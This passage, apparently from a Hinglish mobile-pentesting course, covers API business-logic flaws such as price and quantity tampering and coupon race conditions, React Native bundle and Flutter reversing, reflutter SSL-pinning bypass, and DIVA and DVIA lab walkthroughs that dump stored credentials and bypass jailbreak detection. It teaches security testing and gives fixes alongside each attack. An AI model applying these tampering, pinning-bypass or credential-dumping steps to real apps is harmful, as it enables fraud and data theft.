        2.  Attacker dimaag lagata hai: "Kya ho agar main 'quantity' ko `-1` (negative) kar doon?"
        3.  Burp Request: `POST /api/cart/add` (Body: ` {"item_id": 123, "quantity":  `**`-1`**`}`)
        4.  Server (jisne negative check nahi lagaya) `item_id=123` (iPhone) ko `-1` quantity se add karta hai.
        5.  **Cart Total: -Rs. 1,00,000.** (Negative total).
        6.  Attacker cart mein ek "Pen" (Rs. 20) add karta hai.
        7.  **Final Cart Total: -Rs. 99,980.**
        8.  Attacker "Checkout" karta hai... Server (sochta hai) "User se -99,980 lene hain." (matlab) "User ko 99,980 *dene* hain."
        9.  Boom\! 💥 Attacker ko ek pen aur Rs. 99,980 (refund) mil jaate hain.

7.  **💻 Code example / Command Example (Parameter Tampering):**

      * **Vulnerable Request (Burp Repeater):**
        ```http
        # 1. User (attacker) Rs. 500 ka item '123' checkout kar raha hai.
        # 2. Server (Trusting client) ne 'price' ko bhi request mein daal diya.

        POST /api/v1/checkout HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer <user_token>

        {
          "item_id": "123",
          "quantity": 1,
          "price_per_item": 500 
        }
        ```
      * **Exploitation (Burp Repeater):**
        ```http
        # 3. Attacker ne price ko 500 se badal kar 1 kar diya.

        POST /api/v1/checkout HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer <user_token>

        {
          "item_id": "123",
          "quantity": 1,
          "price_per_item": 1   # 🐞 BADAL DIYA!
        }
        ```
      * **✍️ Line-by-line explanation:**
          * `price_per_item: 1`: Attacker ne server ko bola "Main item '123' le raha hoon... aur iska price '1' rupay hai."
      * **🚀 Quick run expected output (Vulnerable):**
          * Server (jo client par trust karta hai) `price_per_item` (1) ko `quantity` (1) se multiply karega.
          * `Total: 1 * 1 = 1`.
          * Server `200 OK` dega aur attacker se Rs. 500 ke item ke liye *sirf* Rs. 1 charge karega. 💥
      * **Vulnerable Server Code (Node.js):**
        ```javascript
        // 🐞 KHATRA: Server 'price' client se le raha hai.
        app.post('/api/v1/checkout', (req, res) => {
          let price = req.body.price_per_item; // 🐞 Client ne bola price 1 hai
          let quantity = req.body.quantity;
          let total = price * quantity; // 🐞 Server ne maan liya (1 * 1 = 1)
          
          chargeUser(req.user.id, total); // User ko Rs. 1 charge kiya
          res.json({"status": "success"});
        });
        ```
      * **Secure Server Code (Node.js):**
        ```javascript
        // ✅ SAFE: Server 'price' client se nahi, *apne database* se nikaal raha hai.
        app.post('/api/v1/checkout', (req, res) => {
          let itemId = req.body.item_id;
          let quantity = req.body.quantity;
          
          // 💡 Yahi hai "Logic Check"
          let price = db.getItemPrice(itemId); // 🐞 Price DB se aaya (e.g., 500)
          
          let total = price * quantity; // 🐞 Ab yeh safe hai (500 * 1 = 500)
          
          chargeUser(req.user.id, total); // User ko Rs. 500 charge karega
          res.json({"status": "success"});
        });
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * Sirf technical bugs (SQLi, IDOR) dhoondhna. (Logic bugs miss kar dena).
      * App ko "attacker" ki tarah na sochna. Hamesha socho: "Main is feature ko kaise tod sakta hoon?"
      * "Happy Path" (jo app chahti hai) follow karna. Hamesha "Unhappy Path" (jo app nahi chahti) try karo:
          * `quantity = -1` (Negative)
          * `quantity = 9999999` (Bahut bada)
          * `quantity = 0`
          * `price = 0` ya `price = -100`
          * `username` ki jagah `victim` ka username daalna.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main 'soch' waali galti (logic flaw) kaise dhoondhunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
          * **Scenario:** "Password Reset"
          * **Normal Flow:** 1. Email daalo. 2. OTP (jo email pe aaya) daalo. 3. Naya password daalo.
          * **Attacker's Mindset:**
              * *Q1:* Kya main Step 2 (OTP) ko skip karke seedha Step 3 (New Password) waali API call kar sakta hoon? (BFLA, M6.2)
              * *Q2:* Kya main Step 1 mein *Victim* ka email daalu, lekin Step 3 mein *Apna* email?
              * *Q3:* OTP (e.g., 123456) ko `Burp Intruder` se brute-force kar sakta hoon? (Kya Rate Limiting nahi hai?)
              * *Q4:* Step 2 mein `OTP=123456` check karne ke baad, Step 3 (jahan password set hota hai) ki request mein `user_id` parameter hai? Kya main wahan *victim* ki `user_id` daal sakta hoon? (IDOR, M6.1)
      * **😈 Real Attack Scenario (Criminal Perspective):**
          * Attacker ek "Food Delivery" app mein "Apply Coupon" feature test karta hai.
          * Woh `COUPON_100` (Rs. 100 off) apply karta hai. Burp mein request jaati hai.
          * Woh us request ko `Burp Intruder` mein bhejta hai aur (Race Condition) *ek saath 10 baar* bhej deta hai.
          * Server (jo check nahi kar raha tha) `100 * 10 = Rs. 1000` ka discount de deta hai (jabki coupon ek hi baar use hona tha).
      * **💰 Real Bug Bounty Example:** **Zomato (2016).** Ek researcher ne dhoondha ki woh order ki `quantity` ko `negative` (`-1`) set kar sakta tha, jisse uska final bill (Total) negative ho jaata tha. Zomato ko use *paise waapas* (refund) karne padte thay. Yeh classic business logic flaw tha.

10. **✅ Quick checklist / Mitigation:**

      * App ke har "feature" (flow) ko map karo.
      * Har parameter (quantity, price, coupon, user\_id) ko "tamper" (badal kar) dekho.
      * "Unhappy paths" (negative, zero, large values) try karo.
      * Race Conditions (ek saath 10 request) try karo.
      * **Fix:** Server par har input ko validate karo (`quantity > 0`). Client se aaye `price` par *kabhi* trust mat karo, hamesha DB se lo. Critical actions (OTP check, Payment) ko atomic (ek hi step mein) banao taaki race condition na ho.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * `crAPI` (Vulnerable API) lab setup karo.
      * "Shop" feature mein jaao.
      * Burp Repeater ka istemaal karke `price` ya `quantity` ko modify (tamper) karke dekho ki kya aap free mein item order kar sakte ho.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Burp Suite Repeater` (Manual), `Burp Suite Intruder` (Race Condition).
      * **OWASP:** [API10: Unsafe Consumption of APIs](https://www.google.com/search?q=https://owasp.org/www-project-api-security/assets/2023/en/src/0x10-unsafe-consumption.md) (Logic Flaws ke liye naya naam).

-----

Module 6 complete\! 🏁 Yeh sabse zaroori module tha. Humne API hacking ke 5 bade pillars (IDOR, BFLA, JWT, SSRF, Logic Flaws) seekh liye hain. Ab aap 90% critical bugs dhoondhne ke kaabil ho gaye hain.

Ab humara focus Native se hat kar "Cross-Platform" (jo dono par chalti hain) apps par jaayega. Jab aap ready hon, toh batana. Hum **Module 7: Advanced Hacking (Cross-Platform Apps)** shuru karenge\! 📱

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 7\! 🚀

Module 6 mein humne API hacking ka 'goldmine' 💰 (IDOR, BOLA, SSRF) lootna seekh liya. Lekin ab tak hum 'Native' apps (jo Java/Kotlin ya Swift/Objective-C mein banti hain) par focus kar rahe thay.

Zamana badal gaya hai. Aaj kal 90% apps 'Cross-Platform' (React Native, Flutter) mein banti hain (taaki ek hi code Android/iOS dono par chale). Is module mein hum in 'hybrid' apps ko reverse karna aur inki sabse badi kamzori (SSL Pinning) ko todna seekhenge. Yeh 'NEW & CRITICAL' topics hain\!

-----

## 7.1: React Native Pentesting (Reversing `index.android.bundle`, Debugging)

1.  **🎯 Title / Short Summary:** React Native Hacking ⚛️. App ka JavaScript 'Bundle' churana aur saara source code padhna.

2.  **🤔 Kya hai? (What?):** React Native (RN) ek Facebook ka framework hai jo developers ko **JavaScript** (JS) ka istemaal karke Android aur iOS dono ke liye app banane deta hai.

3.  **💡 Kyu important hai? (Why?):** Developers app ka *poora business logic* (API calls, internal logic, kahan navigate karna hai) ek **single JavaScript file** (`.bundle`) mein daal dete hain. Agar hum (attacker) us file ko nikaal lein, toh humein app ka poora (human-readable) source code mil jaata hai\!

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Critical)** Jab aap `JADX` (M3.2) mein code dekhein aur aapko `com.facebook.react` packages dikhein.
      * **Android (APK):** App ko unzip karke `assets/` folder ke andar `index.android.bundle` naam ki file dhoondho.
      * **iOS (IPA):** App ko unzip karke `Payload/<AppName>.app/` folder ke andar `main.jsbundle` naam ki file dhoondho.
      * **Galti:** Developer ki galti JS code ko 'obfuscate' (chhipana) na karna, aur secrets (API keys) seedha JS code mein hardcode kar dena.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * Aap app ka 99% logic miss kar denge (kyunki Java/Swift mein kuch hota hi nahi hai).
      * Aap app ke *saare* hardcoded secrets (API keys, tokens, 'admin' endpoints) ko miss kar denge jo uss `.bundle` file mein plain text mein likhe thay. Yeh M3.2 (Hardcoded Secrets) ka "Easy Mode" hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **RN App Kya Hai:** Yeh ek 'Native Container' (wrapper) hai, jiske andar ek JavaScript engine chalta hai jo `index.android.bundle` file ko padh kar UI banata hai aur logic chalata hai.
      * **Humara Attack (Static):**
        1.  APK ko unzip karo (ya `adb pull` karo).
        2.  `assets/index.android.bundle` file ko nikaalo.
        3.  Yeh file 'minified' (sab ek line mein) hoti hai.
        4.  Ise 'JS Beautifier' (online tool) ya `VS Code` (Right Click -\> Format Document) se 'pretty print' (sundar) banao.
        5.  `Ctrl+F` (Search) karo: `apiKey`, `secret`, `http://`, `https://api...`
      * **Humara Attack (Dynamic - Debugging):** (Advanced)
        1.  Agar app 'debug' mode mein build hui hai, toh hum app ko 'reverse' kar sakte hain.
        2.  Hum app ko (Frida/Objection se) bolte hain ki "apne bundle ke bajaye *mere* (attacker ke) PC se JS code load karo."
        3.  Hum app ko apne PC (Metro server) se connect karke real-time mein JS code badal sakte hain.

7.  **💻 Code example / Command Example:**

      * **Commands (Bundle nikaalna - Android):**

        ```bash
        # 1. APK ko unzip karo
        unzip vulnerable_app.apk -d AppFolder

        # 2. Bundle file ko copy karke padho (VS Code mein)
        cp AppFolder/assets/index.android.bundle .
        code index.android.bundle

        # Ya (agar phone rooted hai)
        # 1. Package name dhoondho
        adb shell pm list packages | grep "appname"

        # 2. Package ka path dhoondho
        adb shell pm path com.vulnerable.app
        # (Output: /data/app/.../base.apk)

        # 3. APK ko seedha pull kar lo
        adb pull /data/app/.../base.apk .
        unzip base.apk -d AppFolder
        ```

      * **Vulnerable JavaScript Code (Bundle ke andar aisa dikhega):**

          * (Beautify karne ke baad)

        <!-- end list -->

        ```javascript
        // ... (hazaaron line ka code)

        // 🐞 BINGO! JADX mein nahi mila, yahan mil gaya
        const API_KEY = "sk_live_12345_THIS_IS_A_REACT_NATIVE_SECRET";

        function login(user, pass) {
          // 🐞 Saare endpoints plain text mein
          fetch("https://api.vulnerable.com/v1/login", {
            method: 'POST',
            headers: { 'Authorization': 'Basic ' + API_KEY },
            body: JSON.stringify({ user: user, pass: pass })
          });
        }

        // 🐞 Admin logic client-side par hi hai!
        function checkAdminAccess() {
          if (currentUser.role === "admin") { // 💡 Hum ise Frida se hook kar sakte hain!
            return true;
          }
          return false;
        }

        // ... (hazaaron line ka code)
        ```

      * **✍️ Line-by-line explanation (Vulnerable Code):**

          * `const API_KEY = "sk_live_..."`: 🐞 **Critical\!** API key JS bundle mein hardcoded hai.
          * `fetch("https://api.vulnerable.com/...")`: 🐞 **High\!** Saare API endpoints (jo M6 mein humein guess karne padte) yahan plain text mein mil gaye.
          * `checkAdminAccess() ... currentUser.role === "admin"`: 🐞 **Critical\!** Logic client-side par hai. Hum Frida se is function ko hook karke hamesha `true` return karwa sakte hain (BFLA/M6.2 bypass).

      * **Secure JavaScript Code (Kaisa hona chahiye tha):**

        ```javascript
        // Key ko 'react-native-dotenv' jaise package se 'build environment' se laana chahiye
        import { API_KEY } from '@env'; 

        // ...

        // Admin check server-side par hona chahiye
        function checkAdminAccess() {
           // Client par 'true/false' return mat karo
           // Sirf server se data maango
           fetch("/api/checkAdmin"); 
        }
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * `JADX` (Java) mein logic dhoondhte rehna. (Logic `.bundle` (JS) mein hai).
      * `.bundle` file ko Text Editor mein kholna aur woh 'minified' (ek line) dikhne par dar jaana. (Hamesha 'Beautify' / 'Format' karo).
      * Yeh sochna ki `Objection` / `Frida` React Native par kaam nahi karega. (Bilkul karega\! Hum Java (M4.1) ke bajaye JavaScript functions ko hook karenge. `Frida` JS runtime ko bhi hook kar sakta hai).
      * SSL Pinning bypass karne ke liye `android sslpinning disable` (Objection) try karna. (Yeh *kabhi kabhi* kaam karta hai, agar RN app `OkHttp` (native) use kar rahi ho. Lekin aksar RN `fetch` (JS) use karta hai, jiske liye *alag* bypass script (jo `fetch` ko hook kare) lagti hai).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main Java mein reverse kar raha hoon par kuch nahi mil raha, app 'khali' lag rahi hai. Logic kahan hai?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester `JADX` kholta hai, `com.facebook.react` dekhta hai. "Aha\! React Native app hai."
        2.  Woh `apktool d app.apk` chalata hai.
        3.  `assets/index.android.bundle` file ko `VS Code` mein kholta hai.
        4.  Use 'Format Document' (Beautify) karta hai.
        5.  `Ctrl+F` se "apiKey" search karta hai.
        6.  Use (upar wala vulnerable code) `const API_KEY = "sk_live_..."` mil jaata hai.
        7.  P1 Critical Bug report file karta hai. (Yeh 5 minute ka kaam tha).
      * **💰 Real Bug Bounty Example:** Bahut saari companies (Coinbase, Discord, Shopify) ki apps mein pehle hardcoded keys unke JS bundles mein mili hain, kyunki developers "build environment" variables ko JS mein galat tareeke se embed kar dete thay.

10. **✅ Quick checklist / Mitigation:**

      * **Check:** `JADX` mein `com.facebook.react` hai?
      * **Find:** `assets/index.android.bundle` (Android) ya `main.jsbundle` (iOS) file.
      * **Action:** Use "Beautify" karo.
      * **Hunt:** `VS Code` mein `apiKey`, `secret`, `token`, `https://api.` search karo.
      * **Bypass:** SSL Pinning bypass ke liye standard Objection scripts ke alawa "React Native fetch" bypass scripts (Frida) bhi try karo.
      * **Fix:** `react-native-dotenv` use karke keys ko build-time par inject karo, code mein mat likho. Logic (jaise admin check) server par rakho.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * GitHub se koi bhi purani, open-source React Native "Todo List" app download karo.
      * Use Android Studio se build karke `.apk` banao.
      * Us `.apk` ko unzip karke `index.android.bundle` nikaalo aur `VS Code` mein padhne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `apktool` (unzip), `VS Code` (read/beautify), `JADX-GUI` (identify).
      * **Frida (Advanced):** `frida-trace -U -i "fetch" com.app` (JS 'fetch' function ko trace karne ke liye).

-----

## 7.2: Flutter Pentesting (Reversing `libapp.so`, Bypassing Pinning)

1.  **🎯 Title / Short Summary:** Flutter Hacking (Dart) 🐦. Google ke framework ko reverse karna (jo C++ jaisa hai) aur uski 'impossible' SSL Pinning ko todna.

2.  **🤔 Kya hai? (What?):** Flutter Google ka framework hai jo 'Dart' language use karta hai. React Native (jo JS file deta hai) ke ult, Flutter poore app logic ko **Native C/C++ Code** mein compile kar deta hai.

3.  **💡 Kyu important hai? (Why?):** **Yeh React Native se 100x zyada mushkil (aur secure) hai.** Yahan koi `.bundle` file nahi milti. Aapko seedha M3.4 (Ghidra Reversing) karna padta hai. Iski SSL Pinning bhi "standard" (OkHttp) nahi hoti, jisse Objection/Frida (normal scripts) **100% fail** ho jaate hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Critical)** Jab aap APK ko unzip karein aur `lib/` folder ke andar `libflutter.so` aur (sabse important) **`libapp.so`** file dekhein.
      * **iOS (IPA):** Jab aap `Payload/<AppName>.app/Frameworks/` ke andar `App.framework` aur `Flutter.framework` dekhein.
      * **Galti:** Developer ki galti (is case mein) nahi hai, framework hi aisa hai. Galti *humari* (pentester) hogi agar hum Objection se bypass try karte rahe.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * Aap "Network Error" (Pinning) par atke reh jaayenge.
      * `objection sslpinning disable` fail hoga. Standard Frida scripts fail hongi.
      * Aap Burp mein traffic *dekh hi nahi payenge*.
      * Agar traffic nahi, toh Module 6 (IDOR, BOLA) ke bugs bhi nahi milenge. Aapka pentest 0% complete hoga.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Problem Kya Hai?** Flutter apps `http` ya `dio` (Dart packages) use karti hain. Yeh packages OS ki (Java/Swift ki) SSL libraries ko call *nahi* karte. Flutter, `libflutter.so` ke andar *apna khud ka* SSL validation (BoringSSL/Dart code) karta hai. Isliye Java (Objection) ya Swift ke hooks fail ho jaate hain.
      * **Reversing (Static):**
        1.  Aapko `libapp.so` (Android) ya `App.framework` (iOS) ko `Ghidra` (M3.4) mein kholna hoga.
        2.  Ghidra mein "Strings" window kholo.
        3.  `http://`, `https://api.`, `apiKey` search karo.
        4.  React Native (JS) jaisa saaf code nahi milega, lekin hardcoded strings (keys, endpoints) mil sakti hain.
      * **Bypassing Pinning (The REAL Challenge):**
          * **Method 1 (Static Patching - `reflutter`):**
            1.  `reflutter` (GitHub) naam ka ek tool hai.
            2.  Yeh `libflutter.so` file ko 'reverse' karta hai, usmein *Burp ka Certificate* 'patch' (inject) kar deta hai, aur app ko rebuild kar deta hai.
            3.  Aapko `apktool`, `apksigner` (M3.5) ki zaroorat nahi padti, yeh tool sab khud kar deta hai.
          * **Method 2 (Dynamic Hooking - Frida - Advanced):**
            1.  Hum Java ko nahi, `libflutter.so` (C++ code) ko hook karte hain.
            2.  Hum `Ghidra` se `libflutter.so` ke andar SSL validation function (jaise `x509.cc` ke `VerifyCertChain`) ka 'offset' (address) dhoondhte hain.
            3.  Hum Frida se us 'address' ko hook karke hamesha `true` return karwate hain. (Yeh bahut advanced hai).

7.  **💻 Code example / Command Example:**

      * **Static Reversing (Ghidra mein `libapp.so`):**

          * (Ghidra kholo -\> `libapp.so` import karo -\> Analyze karo -\> Window -\> Strings)
          * Output (Strings window mein):
            ```
            ... (bahut saara kachra)
            io.flutter.network.Http...
            https://api.vulnerable-flutter-app.com/v1/login
            ...
            sk_live_HARDCODED_DART_KEY_123
            ... (bahut saara kachra)
            ```
          * **Nateeja:** Humne endpoints aur keys (agar hardcoded thin) nikaal li.

      * **Bypassing Pinning (Using `reflutter` - The Easy Way):**

        ```bash
        # (PC par, 'reflutter' tool install karne ke baad)

        # 1. Burp ka certificate (PEM format, M2.4) ready rakho (e.g., burp.pem)

        # 2. 'reflutter' ko APK par chalao
        reflutter --app vulnerable_app.apk --cert burp.pem

        # 3. 'reflutter' output mein ek nayi APK (e.g., vulnerable_app.RE.apk) dega

        # 4. Purani app uninstall karo aur nayi (patched) install karo
        adb uninstall com.vulnerable.app
        adb install vulnerable_app.RE.apk
        ```

      * **✍️ Line-by-line explanation (`reflutter`):**

          * `reflutter --app ... --cert ...`: `reflutter` tool ko bolta hai ki `vulnerable_app.apk` lo, uske `libflutter.so` ko patch karo, aur usmein `burp.pem` (hamara certificate) ko 'trusted' bana do.
          * `adb install ...RE.apk`: Hum modified APK install kar rahe hain jo ab *sirf* hamare Burp certificate par trust karegi.

      * **🚀 Quick run expected output:**

          * `reflutter` chalane par "Patching...", "Rebuilding APK..." aayega.
          * Nayi `.RE.apk` install karne ke baad, app chalaoge toh "Network Error" *chala jaayega* aur Burp (M2.4) mein saara traffic (HTTP/HTTPS) saaf dikhne lagega.
          * Ab aap Module 6 (IDOR, BOLA, etc.) shuru kar sakte hain.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * **Flutter app par `objection sslpinning disable` chalaana aur time waste karna.** (Yeh 99.9% fail hoga. Pehchaano ki app Flutter hai ya nahi).
      * `reflutter` tool ka istemaal na karna. (Yeh Flutter pinning bypass ka sabse aasan tareeka hai).
      * `libapp.so` ko `JADX` mein kholna. (Galat\! `libapp.so` native C++ code hai. `Ghidra` (M3.4) use karo).
      * Yeh sochna ki "traffic nahi dikh raha, matlab app secure hai." (Galat\! Matlab aap pinning bypass nahi kar paaye. Try harder).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Mainne Objection, Frida sab try kar liya, par is app ka traffic (Network Error) bypass nahi ho raha. Yeh kya hai?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester (aap) dekhta hai traffic nahi aa raha. Objection fail.
        2.  APK ko unzip karta hai. Dekhta hai `lib/arm64-v8a/libflutter.so` aur `libapp.so` hai.
        3.  "Aha\! Flutter app hai. Isliye Objection fail hua."
        4.  Woh Burp se `cacert.pem` certificate export karta hai.
        5.  `reflutter` tool (GitHub se) download karta hai.
        6.  `reflutter --app original.apk --cert cacert.pem` command chalata hai.
        7.  Nayi `original.RE.apk` milti hai.
        8.  Ise `adb install` karta hai.
        9.  Burp setup (M2.4) karta hai. App kholta hai.
        10. Boom\! 💥 Saara API traffic Burp mein aane lagta hai.
        11. Ab woh M6 (IDOR, BOLA) ke liye API ko Burp Repeater mein test karna shuru karta hai.
      * **💰 Real Bug Bounty Example:** Aap "Flutter SSL Pinning Bypass" ko bug report *nahi* kar sakte (yeh aapki skill hai). Lekin is bypass ko *karne ke baad* jo aap API bug (jaise IDOR) dhoondhte hain, uske liye P1 bounty milti hai.

10. **✅ Quick checklist / Mitigation:**

      * **Identify:** APK mein `libflutter.so` aur `libapp.so` hain? (Toh Flutter hai).
      * **Static:** `libapp.so` ko `Ghidra` mein khol kar `Strings` check karo.
      * **Bypass (Pinning):** Standard tools bhool jaao. Seedha `reflutter` tool ka istemaal karo.
      * **Test:** Traffic milne ke baad, M6 (API Hacking) par focus karo.
      * **Fix:** Flutter mein pinning by default strong hai. Developers ko kuch extra karne ki zaroorat nahi, lekin server-side (M6) security par poora dhyaan dena chahiye.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * GitHub se "Flutter HTTP Pinning Example" app download karo.
      * Use build karke `.apk` banao.
      * Pehle `Objection` se bypass try karo (fail hoga).
      * Fir `reflutter` tool setup karo aur use `Burp cert` ke saath patch karke traffic nikaalne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Ghidra` (reversing `libapp.so`), `reflutter` (pinning bypass).
      * **Concepts:** `Dart AOT Compilation`, `BoringSSL` (Flutter ki SSL library).

-----

Module 7 complete\! 🏁 Humne Native (M1-M6) aur Cross-Platform (M7) dono ko reverse karna aur unki sabse badi rukawat (Pinning) ko todna seekh liya hai.

Ab aap technical roop se 99% apps ko test karne ke liye ready hain. Aakhri module mein hum seekhenge ki in saari findings ko ek professional 'Report' mein kaise badalte hain, aur Bug Bounty/Job kaise shuru karte hain.

Jab aap ready hon, toh batana. Hum aakhri **Module 8: Job Ready - Labs, Reporting & Career** shuru karenge\! 👨‍💻📄

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 8\! 🚀

Yeh hamara aakhri module hai. Ab tak aapne lab setup (M1), app anatomy (M2), reversing (M3), Frida (M4), client-side vulns (M5), API hacking (M6), aur cross-platform (M7) seekh liya hai. Ab waqt hai "Job Ready" 📄 banne ka.

Is module mein hum seekhe hue sabhi skills ko real-world labs (DIVA, DVIA) par apply karenge, ek professional pentest report likhna seekhenge, aur bug bounty/career ke liye strategy banayenge. Chalo, is course ko finish line tak pahunchate hain\! 🏁

-----

## 8.1: Android Lab: DIVA Walkthrough (All Challenges)

1.  **🎯 Title / Short Summary:** Android Hacking Ki Pareeksha (DIVA) 🎓. DIVA (Damn Insecure and Vulnerable App) ke saare challenges ko solve karna.

2.  **🤔 Kya hai? (What?):** DIVA ek purposeful (jaan boojh kar) vulnerable Android app hai. Yeh naye pentesters ke liye ek "practice ground" (akhada) hai taaki woh M5 aur M3 mein seekhi hui vulnerabilities (jaise Insecure Storage, SQLi, Hardcoding) ko real app par dhoondh sakein.

3.  **💡 Kyu important hai? (Why?):** Sirf theory padhna kaafi nahi hai. DIVA aapko hands-on experience deta hai. Jab aap `adb shell`, `sqlite3`, `JADX`, aur `Drozer` ka istemaal karke "asli" (demo) password nikaalte hain, tab concept pakka hota hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Module 1-7 complete karne ke *baad*. Yeh aapka final exam jaisa hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aapko confidence nahi aayega. Aapko pata hi nahi chalega ki jo M3 mein `JADX` seekha tha, use M5 ke "Hardcoding" bug ko dhoondhne ke liye *kaise* istemaal karna hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (Challenge Examples):**

      * **Challenge 1: Insecure Data Storage 1 (M5.1)**
          * **Task:** App, "username" aur "password" save karti hai. Use dhoondho.
          * **Walkthrough:**
            1.  App mein "test/password" daal kar save karo.
            2.  Rooted phone par `adb shell` chalao.
            3.  `su` (root bano).
            4.  `cd /data/data/jakhar.aseem.diva/shared_prefs/`
            5.  `cat diva_prefs.xml`
            6.  Output mein XML ke andar `<string name="user">test</string>` aur `<string name="password">password</string>` mil jaayega. 💥
      * **Challenge 2: Insecure Data Storage 4 (M5.3)**
          * **Task:** SQL Database se data nikaalo.
          * **Walkthrough:**
            1.  `cd /data/data/jakhar.aseem.diva/databases/`
            2.  `sqlite3 ids2.db` (Database ko kholo).
            3.  `sqlite> .tables` (Table ka naam dekho, e.g., `myuser`).
            4.  `sqlite> SELECT * FROM myuser;`
            5.  Output mein `(test|password)` mil jaayega. 💥
      * **Challenge 3: Hardcoding Issues 1 (M3.2)**
          * **Task:** Code mein hardcoded "Vendor API Key" dhoondho.
          * **Walkthrough:**
            1.  `DIVA.apk` ko `JADX-GUI` mein kholo.
            2.  `HardcodeActivity.java` (ya `Hardcode2Activity.java`) class mein jaao.
            3.  Code (Java) ko padho. Aapko `private String accessKey = "Vendor_secret_key";` seedha likha mil jaayega. 💥
      * **Challenge 4: Access Control Issues 1 (M5.4 / M4.2)**
          * **Task:** Ek 'private' activity (API Credentials waali) ko direct kholo.
          * **Walkthrough (Drozer):**
            1.  `drozer console connect`
            2.  `dz> run app.package.attacksurface jakhar.aseem.diva` (Exported components dekho).
            3.  Aapko `jakhar.aseem.diva.APICredsActivity` dikhegi jo "exported" hai.
            4.  `dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity`
            5.  Phone par (bina login) API keys waali screen khul jaayegi. 💥

7.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):** Yahi DIVA ke challenges hi real-world pentest scenarios hain. Har challenge ek real vulnerability ko copy karta hai jo humne M3, M4, aur M5 mein seekhi hai.

8.  **✅ Quick checklist / Mitigation:**

      * Har challenge ko pehle khud try karo.
      * Agar phans jaao, toh dekho ki woh M1-M7 ke kis topic se related hai (e.g., "Hardcoding" -\> M3.2 JADX).
      * `adb`, `sqlite3`, `JADX`, `Drozer` ka bharpoor istemaal karo.

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA APK download karo.
      * Uske saare 13 challenges ko (bina guide dekhe) solve karne ki koshish karo.

10. **📚 Further reading / commands / tools:**

      * **Tools:** `adb`, `sqlite3`, `JADX-GUI`, `Drozer`.
      * **Lab:** `DIVA (Damn Insecure and Vulnerable App)`

-----

## 8.2: iOS Lab: DVIA / iGoat Walkthrough (All Challenges)

1.  **🎯 Title / Short Summary:** iOS Hacking Ki Pareeksha (DVIA) 🎓. DVIA (Damn Vulnerable iOS App) ke challenges ko solve karna.

2.  **🤔 Kya hai? (What?):** Yeh DIVA ka iOS version hai. Yeh ek purposeful vulnerable iOS app hai jo jailbroken phone par chalti hai. Isse hum M5 aur M4 mein seekhi iOS vulnerabilities (jaise Insecure Storage, Jailbreak Detection, URL Schemes) ko practice karte hain.

3.  **💡 Kyu important hai? (Why?):** iOS pentesting (bina practice) bahut mushkil lagti hai. DVIA aapko `Filza`, `Frida`, `Objection`, `Cycript`, aur `Keychain_dumper` jaise tools ko *asli* (demo) bug par use karne ka mauka deta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Module 1-7 complete karne ke *baad*. Yeh iOS ke liye aapka final exam hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aapko jailbroken phone ka file system (M5.2) samajh nahi aayega, `FLEXall` (M4.3) se UI hack karna nahi aayega, aur `Frida` se iOS classes ko hook karna (M4.4) confidence nahi dega.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (Challenge Examples):**

      * **Challenge 1: Local Data Storage (M5.2)**
          * **Task:** App, "username" aur "password" save karti hai. Use dhoondho.
          * **Walkthrough:**
            1.  App mein login karo.
            2.  Jailbroken phone par `Filza` (File Manager) kholo.
            3.  App ka data container dhoondho: `/var/mobile/Containers/Data/Application/<APP_UUID>/`
            4.  `Library/Preferences/` folder mein jaao.
            5.  `com.prateek.DVIA.plist` file ko Text Editor mein kholo.
            6.  Output mein XML ke andar `<key>password</key><string>password123</string>` mil jaayega. 💥
      * **Challenge 2: Keychain (M5.2)**
          * **Task:** Keychain se sensitive data dump karo.
          * **Walkthrough:**
            1.  PC se phone mein SSH karo.
            2.  `Keychain_dumper` (M5.2) ko phone par `scp` karke `chmod +x` karo.
            3.  `./keychain_dumper` chalao.
            4.  Output mein (bahut saare data ke beech) DVIA ka "secret" data mil jaayega. 💥
      * **Challenge 3: Jailbreak Detection (M4.4)**
          * **Task:** App, jailbreak detect karke band ho jaati hai. Bypass karo.
          * **Walkthrough (Objection):**
            1.  PC par, app ka bundle ID (e.g., `com.prateek.DVIA`) dhoondho.
            2.  `objection -g com.prateek.DVIA explore`
            3.  `DVIA #> ios jailbreak disable`
            4.  Objection, common checks (jaise `Cydia.app` file check) ko hook kar dega.
